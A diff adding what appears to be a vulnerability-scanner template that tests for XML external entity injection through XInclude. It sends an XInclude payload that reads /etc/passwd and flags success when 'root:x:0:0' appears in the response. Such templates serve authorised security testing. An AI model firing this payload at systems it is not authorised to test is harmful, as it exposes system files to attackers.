@@ -1,0 +1,23 @@
+id: patt-xxe-xinclude-01-xml
+name: 'PATT xxe patt-xxe-xinclude-01 via xml'
+severity: critical
+type: active
+tags:
+  - xxe
+  - patt
+  - filterdoctype
+requires:
+  - java
+  - php
+description: 'PATT XInclude when DOCTYPE diblok tapi XInclude aktif. [patt:patt-xxe-xinclude-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      xml:
+        - '<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></r>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
